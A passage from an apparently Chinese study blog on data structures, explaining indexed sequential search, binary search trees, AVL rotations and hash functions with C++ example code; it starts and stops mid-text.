href="#索引顺序表的存储要求" class="headerlink" title="索引顺序表的存储要求"></a>索引顺序表的存储要求</h5><p>两张表 一张线性表 一张索引表</p><p>线性表要求：查找表分为n块，当i&gt;j时，第i块中的最小元素的关键字大于第j块中的最大元素的关键字</p><p>索引表要求：1.索引表是顺序存储 2.索引表里存储了各个块的最大值和开始地址</p><h5 id="索引顺序表的查找思想"><a href="#索引顺序表的查找思想" class="headerlink" title="索引顺序表的查找思想"></a>索引顺序表的查找思想</h5><p>1.首先确定所要查找的关键字在哪一块</p><p>2.在所确定的块中用顺序查找查找关键字</p><h5 id="索引表的存储结构"><a href="#索引表的存储结构" class="headerlink" title="索引表的存储结构"></a>索引表的存储结构</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> maxblock 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  KeyType key;</span><br><span class="line">  <span class="type">int</span> addr;</span><br><span class="line">&#125;indextype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  indextype index[maxblock];</span><br><span class="line">  <span class="type">int</span> block;</span><br><span class="line">&#125;INtable;</span><br></pre></td></tr></table></figure><h5 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  main.cpp</span></span><br><span class="line"><span class="comment">//  索引顺序表</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by 徐可钊 on 2023/11/20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxblock 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  KeyType key;</span><br><span class="line">    <span class="type">int</span> addr;</span><br><span class="line">&#125;indextype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  indextype index[maxblock];</span><br><span class="line">  <span class="type">int</span> block;</span><br><span class="line">&#125;INtable;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Search</span><span class="params">(SSTable ST,INtable IX,KeyType key )</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,s=<span class="number">0</span>,e;</span><br><span class="line">    <span class="comment">//s记录查找表中的开始位置</span></span><br><span class="line">    <span class="comment">//e记录查找表中的结束位置</span></span><br><span class="line">    <span class="keyword">while</span>((key&gt;IX.index[i].key)&amp;&amp;(i&lt;IX.block))&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;IX.block)&#123;</span><br><span class="line">        s=IX.index[i].addr;</span><br><span class="line">        <span class="keyword">if</span>(i==IX.block<span class="number">-1</span>) e=ST.length;</span><br><span class="line">        <span class="keyword">else</span> e=IX.index[i+<span class="number">1</span>].addr<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(key!=ST.elem[s].key&amp;&amp;s&lt;=e)</span><br><span class="line">    &#123;</span><br><span class="line">        s+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(s&lt;=e) <span class="keyword">return</span> s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(KeyType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="number">22</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">20</span>;</span><br><span class="line">    <span class="comment">//==========</span></span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">33</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">42</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">48</span>;</span><br><span class="line">    <span class="comment">//==========</span></span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">49</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">60</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">86</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">53</span>;</span><br><span class="line">    INtable IX;</span><br><span class="line">    IX.block=<span class="number">3</span>;</span><br><span class="line">    IX.index[<span class="number">0</span>].key=<span class="number">22</span>;</span><br><span class="line">    IX.index[<span class="number">0</span>].addr=<span class="number">0</span>;</span><br><span class="line">    IX.index[<span class="number">1</span>].key=<span class="number">48</span>;</span><br><span class="line">    IX.index[<span class="number">1</span>].addr=<span class="number">4</span>;</span><br><span class="line">    IX.index[<span class="number">2</span>].key=<span class="number">86</span>;</span><br><span class="line">    IX.index[<span class="number">2</span>].addr=<span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search</span>(ST, IX, <span class="number">53</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search</span>(ST, IX, <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search</span>(ST, IX, <span class="number">49</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="算法分析-2"><a href="#算法分析-2" class="headerlink" title="算法分析"></a>算法分析</h5><p>如果索引表长度为b，每块平均程度为L 平均查找长度为：$(b+1)/2+(L+1)/2$</p><p>长度为n的线性表，平均分为$\sqrt n$  查找次数最少</p><h3 id="动态查找表"><a href="#动态查找表" class="headerlink" title="动态查找表"></a>动态查找表</h3><h4 id="二叉排序树和平衡二叉树"><a href="#二叉排序树和平衡二叉树" class="headerlink" title="二叉排序树和平衡二叉树"></a>二叉排序树和平衡二叉树</h4><h5 id="二叉排序树的定义"><a href="#二叉排序树的定义" class="headerlink" title="二叉排序树的定义"></a>二叉排序树的定义</h5><p>二叉排序树(Binary Sort Tree)或者是一颗空树；或者是具有下列性质的二叉树：若根结点有左子树，则左子树上所有结点关键字的值均小于根结点的关键字的值；若根结点有右子树，则右子树上所有结点关键字的值均大结点的关键字的值；根结点的左右子树也分别为二叉排序树。</p><h5 id="二叉排序树的结点查找"><a href="#二叉排序树的结点查找" class="headerlink" title="二叉排序树的结点查找"></a>二叉排序树的结点查找</h5><p>例：<img src="/2023/11/21/二叉排序树的例子.png" alt="二叉排序树例子"><br>查找思想：</p><p>1.当二叉排序树不空时，先将给定值和根结点的关键字比较，若相等，则查找成功；否则：</p><p>2.若给定值小于根结点的关键字，则在左子树上继续进行查砸后</p><p>3.若给定值大于根结点的关键字，则在右子树上继续进行查找</p><p>4.直到找到或查到空结点为止。</p><p>存储结构</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">    <span class="comment">//  其他信息</span></span><br><span class="line">&#125;TElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span> *lch,*rch;</span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiTNode</span>* <span class="built_in">createNode</span>(<span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* newNode = (BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> BiTNode));</span><br><span class="line">    newNode-&gt;data.key = value;</span><br><span class="line">    newNode-&gt;lch = <span class="literal">NULL</span>;</span><br><span class="line">    newNode-&gt;rch = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    BiTree T=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">    T-&gt;data.key=<span class="number">45</span>;</span><br><span class="line">    T-&gt;lch=<span class="built_in">createNode</span>(<span class="number">12</span>);</span><br><span class="line">    T-&gt;lch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">3</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">37</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">24</span>);</span><br><span class="line">    T-&gt;rch=<span class="built_in">createNode</span>(<span class="number">53</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">100</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">61</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">90</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">78</span>);</span><br><span class="line">    <span class="comment">//创建了如图的二叉排序树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>算法实现</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">    <span class="comment">//  其他信息</span></span><br><span class="line">&#125;TElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span> *lch,*rch;</span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiTNode</span>* <span class="built_in">createNode</span>(<span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* newNode = (BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> BiTNode));</span><br><span class="line">    newNode-&gt;data.key = value;</span><br><span class="line">    newNode-&gt;lch = <span class="literal">NULL</span>;</span><br><span class="line">    newNode-&gt;rch = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">SearchBST</span><span class="params">(BiTree T,KeyType key)</span></span>&#123;</span><br><span class="line">    BiTree p=T;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data.key==key)</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;p-&gt;data.key)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">else</span> p=p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    BiTree T=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">    T-&gt;data.key=<span class="number">45</span>;</span><br><span class="line">    T-&gt;lch=<span class="built_in">createNode</span>(<span class="number">12</span>);</span><br><span class="line">    T-&gt;lch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">3</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">37</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">24</span>);</span><br><span class="line">    T-&gt;rch=<span class="built_in">createNode</span>(<span class="number">53</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">100</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">61</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">90</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">78</span>);</span><br><span class="line">    <span class="comment">//创建了如图的二叉排序树</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">SearchBST</span>(T, <span class="number">24</span>)-&gt;data.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>算法分析</p><p>1.二叉排序树平均查找长度的嘴擦情况与顺序表相同（关键字有序）为$O(n)$</p><p>2.最好情况与折半查找相同，是$O(\log_2{n})$数量级</p><p>3.二叉排序树的平均查找长度是$O(\log_2{n})$</p><p>若，以中序对二叉查找树遍历，特点为：按关键字升序排序</p><h5 id="二叉排序树的结点插入"><a href="#二叉排序树的结点插入" class="headerlink" title="二叉排序树的结点插入"></a>二叉排序树的结点插入</h5><p>算法思想</p><p>1.若二叉树为空，则待插入结点s作为根结点</p><p>2.当二叉排序树非空时：</p><p>将待插结点关键字与根结点进行比较，</p><p>若相等则树中已有此结点，无需插入；</p><p>若小于根结点，插入左子树；</p><p>若大于根结点，插入右子树。</p><p>算法实现</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">    <span class="comment">//  其他信息</span></span><br><span class="line">&#125;TElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span> *lch,*rch;</span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiTNode</span>* <span class="built_in">createNode</span>(<span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* newNode = (BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> BiTNode));</span><br><span class="line">    newNode-&gt;data.key = value;</span><br><span class="line">    newNode-&gt;lch = <span class="literal">NULL</span>;</span><br><span class="line">    newNode-&gt;rch = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">SearchBST</span><span class="params">(BiTree T,KeyType key)</span></span>&#123;</span><br><span class="line">    BiTree p=T;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data.key==key)</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;p-&gt;data.key)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">else</span> p=p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SearchBST</span><span class="params">(BiTree T,KeyType key ,BiTree f,BiTree &amp;p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T)&#123;p=f;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key==T-&gt;data.key)&#123;p=T;<span class="keyword">return</span> <span class="number">1</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T-&gt;data.key) <span class="keyword">return</span> <span class="built_in">SearchBST</span>(T-&gt;lch,key,T,p);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">SearchBST</span>(T-&gt;rch, key,T,p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertBST</span><span class="params">(BiTree &amp;T,TElemType e)</span></span>&#123;</span><br><span class="line">    BiTree p,s;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">SearchBST</span>(T, e.key,<span class="literal">NULL</span>,p))&#123;</span><br><span class="line">        s=(BiTree)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        s-&gt;data=e;</span><br><span class="line">        s-&gt;lch=s-&gt;rch=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(!p) T=s;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(e.key&lt;p-&gt;data.key)</span><br><span class="line">            p-&gt;lch=s;</span><br><span class="line">        <span class="keyword">else</span> p-&gt;rch=s;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertBST_D</span><span class="params">(TElemType e,BiTree &amp;T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        T=(BiTree)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        T-&gt;data=e;</span><br><span class="line">        T-&gt;lch=T-&gt;rch=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e.key&lt;T-&gt;data.key)&#123;</span><br><span class="line">        <span class="built_in">InsertBST_D</span>(e, T-&gt;lch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e.key&gt;T-&gt;data.key)&#123;</span><br><span class="line">        <span class="built_in">InsertBST_D</span>(e, T-&gt;rch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    BiTree T=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">    T-&gt;data.key=<span class="number">45</span>;</span><br><span class="line">    T-&gt;lch=<span class="built_in">createNode</span>(<span class="number">12</span>);</span><br><span class="line">    T-&gt;lch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">3</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">37</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">24</span>);</span><br><span class="line">    T-&gt;rch=<span class="built_in">createNode</span>(<span class="number">53</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">100</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">61</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">90</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">78</span>);</span><br><span class="line">    <span class="comment">//创建了如图的二叉排序树</span></span><br><span class="line">    TElemType e;</span><br><span class="line">    e.key=<span class="number">23</span>;</span><br><span class="line">    <span class="built_in">InsertBST</span>(T, e);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">SearchBST</span>(T, <span class="number">23</span>)-&gt;data.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>算法分析</p><p>1.二叉排序树的插入算法时间复杂度与查找算法的时间复杂性相同</p><p>2.最好情况是$O(log_2{n})$;最坏情况是$O(n)$;平均情况是$O(log_2{n})$</p><p>生成一个二叉排序树的方法就是从空树开始循环调用插入算法</p><h5 id="二叉排序树的结点删除"><a href="#二叉排序树的结点删除" class="headerlink" title="二叉排序树的结点删除"></a>二叉排序树的结点删除</h5><p>定义：在二叉查找树上删除一个结点，要求删除结点后仍然保持原来二叉树的结构特点不变。</p><p>删除方法</p><p>设被删的结点为p，其双亲结点为f，则p可能有以下四种情况：</p><p>1.p为叶子结点</p><p>​    释放结点p，修改父结点f的相应结点</p><p>2.p只有左子树</p><p>​    释放结点p，p的左子树顶替p的位置</p><p>3.p只有右子树</p><p>​    释放结点p，p的右子树顶替p的结点</p><p>4.p左右子树都有</p><p>​    把左子树作为右子树中最小结点的左子树</p><p>​    或者把右子树作为左子树中最大节点的右子树</p><p>​    缺点是增加树的高度</p><p>​    改进方法：找一个结点顶替p的位置</p><p>​    这个结点满足：左子树中最大或者右子树中最小</p><h5 id="平衡二叉树的构建"><a href="#平衡二叉树的构建" class="headerlink" title="平衡二叉树的构建"></a>平衡二叉树的构建</h5><p>定义：平衡二叉树又称AVL树，一棵AVL树或者是空树，或者是具有以下性质的二叉排序树：他的所有结点的左子树和右子树的高度之差的绝对值不超过1</p><p>平衡因子的定义：任一结点的左子树的高度减去右子树的高度所得的高度差称为该结点的平衡因子BF，根据AVL树的定义，任一结点的平衡因子只能取-1，0，1。一棵平衡二叉排序树如果有n个结点，其高度可以保持在$O(\log_2n)$,平均查找长度也可以保持在$O(\log_2n)$</p><p>因为插入右子树的右子树导致不平衡，调整办法为RR旋转，实际操作是向左旋转</p><p>因为插入左子树的左子树导致不平衡，调整办法为LL旋转，实际操作是向右旋转</p><p>因为插入左子树的右子树导致不平衡，调整办法为LR旋转，实际操作是先左旋，再右旋</p><p>因为插入右子树的左子树导致不平衡，调整办法为RL旋转，实际操作是先右旋，再左旋</p><p>构造思想</p><p>在构造中，每当插入一个新结点时，首先检查是否因为插入而破坏了树的平衡性</p><p>若是，则找出其中的最小不平衡子树，在保持二叉排序树特性的前提下，调整最小不平衡子树中各结点之间的连接关系，以达到新平衡</p><p>最小不平衡子树：以离插入结点最近，平衡因子绝对值大于1的结点作为根的子树</p><p>操作实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">R_Rotate</span><span class="params">(BiTree &amp;p)</span></span>&#123;   <span class="comment">//LL型 右旋</span></span><br><span class="line">    BiTree lc;</span><br><span class="line">    lc=p-&gt;lch;</span><br><span class="line">    p-&gt;lch=lc-&gt;rch;</span><br><span class="line">    lc-&gt;rch=p;</span><br><span class="line">    p=lc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">L_Rotate</span><span class="params">(BiTree &amp;p)</span></span>&#123;   <span class="comment">//RR型 左旋</span></span><br><span class="line">    BiTree rc;</span><br><span class="line">    rc=p-&gt;rch;</span><br><span class="line">    p-&gt;rch=rc-&gt;lch;</span><br><span class="line">    rc-&gt;lch=p;</span><br><span class="line">    p=rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="哈希查找"><a href="#哈希查找" class="headerlink" title="哈希查找"></a>哈希查找</h3><h4 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h4><p>哈希(散列)技术：把记录(元素)的存储位置和该记录的关键字的值之间建立一种映射关系。关键字的值在这种映射下的像就是相应记录在表中的存储位置</p><p>散列技术在理想状况下查找的期望时间是$O(1)$</p><p>设U表示所有可能出现的关键字集合，K表示实际出现的关键字集合即K$\subseteq$U,F[B]是一个数组；从U到表F[B]下标集合上的一个映射h：U-&gt;{0,1,2,…,B-1}称为<strong>散列函数</strong>(哈希函数，杂凑函数)</p><p>数组F称为散列表(Hash表，杂凑表),数组中每一个单元被称为桶(bucket)</p><p>对于任意关键字k$\in$U，函数值h(k)称为k的散列地址（Hash地址，散列值，存储地址，桶号）</p><p>将结点按关键字的散列地址存储到散列表的过程称为散列</p><p>不同关键字具有相同的散列地址的现象，称为散列冲突，这两个关键字称为同义字</p><p>哈希函数的构造原则：</p><p>计算简单，散列函数不应该有很大的计算量，会降低查找效率</p><p>分布均匀：散列函数值即散列地址要尽量均匀的分布在地址空间，这样才能保证存储空间的有效利用并减少冲突</p><h4 id="哈希函数的构造方法"><a href="#哈希函数的构造方法" class="headerlink" title="哈希函数的构造方法"></a>哈希函数的构造方法</h4><h5 id="直接定址法"><a href="#直接定址法" class="headerlink" title="直接定址法"></a>直接定址法</h5><p>取关键字或关键字的某个线性函数值为哈希地址</p><p>$H(key)=a*key+b$</p><p>其中a,b为常数，又称$H(key)$为自身函数</p><p>优点：没有冲突</p><p>确定：若关键字取值跨度很大，浪费存储空间严重</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Hash</span><span class="params">(KeyType key)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> key/<span class="number">10</span><span class="number">-150</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="质数除余法"><a href="#质数除余法" class="headerlink" title="质数除余法"></a>质数除余法</h5><p>如果表长为n，取小于或等于n的最大质数m作模，关键字通过m取模运算，所得值作为散列地址</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">isPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(n);i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(n%i==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FindPre</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isPre</span>(n)) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;<span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Hash</span><span class="params">(KeyType key,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> key%<span class="built_in">FindPre</span>(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="处理冲突的方法"><a href="#处理冲突的方法" class="headerlink" title="处理冲突的方法"></a>处理冲突的方法</h4><h5 id="开放地址法"><a href="#开放地址法" class="headerlink" title="开放地址法"></a>开放地址法</h5><p>冲突时，在周围找一个新的空闲地址</p><p>1.线性探测再散列法：若H(key)=d的单元发生冲突，则按下列方法进行探查：</p><p>​    $h_i(k)=(h(k)+i)%n$ n是散列表长度，$1\leqslant i\leqslant 